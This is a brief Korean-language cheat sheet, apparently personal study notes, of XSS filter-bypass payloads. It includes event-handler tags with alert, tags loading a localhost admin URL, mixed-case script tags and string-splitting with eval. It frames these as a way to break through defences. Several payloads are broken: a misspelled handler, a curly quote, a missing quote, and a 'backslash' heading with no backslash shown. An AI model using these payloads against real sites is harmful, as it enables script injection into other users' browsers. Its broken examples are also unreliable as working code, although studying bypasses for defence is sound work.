# XSS 공격을 방어하기 위한 다양한 패치와 필터링 존재.

우리는 그것을 뚫어버려야 한다!!!!

# 1. 백 슬래시

```javascript
<svg onload = "alert('1')">

<img src=# onclick="alert('1')">
<img src=# onmouceover="alert('1')">
```

# 2. 링크

```javascript
<img src="http://127.0.0.1:8000/notice?id=admin">
<embed src="http://127.0.0.1:8000/notice?id=admin"/>
<link rel="stylesheet" href="http://127.0.0.1:8000/notice?id=admin">
<object data=’./notice?id=admin’ ></object>
```

# 3. 대소문자 이용

```javascript
<Script>alert("1")</ScripT>
```

# 4. 문자열 분리

```javascript
<img onclick='var s="aler"+"t(al"+"ert"+"(1));";eval(s);>
```
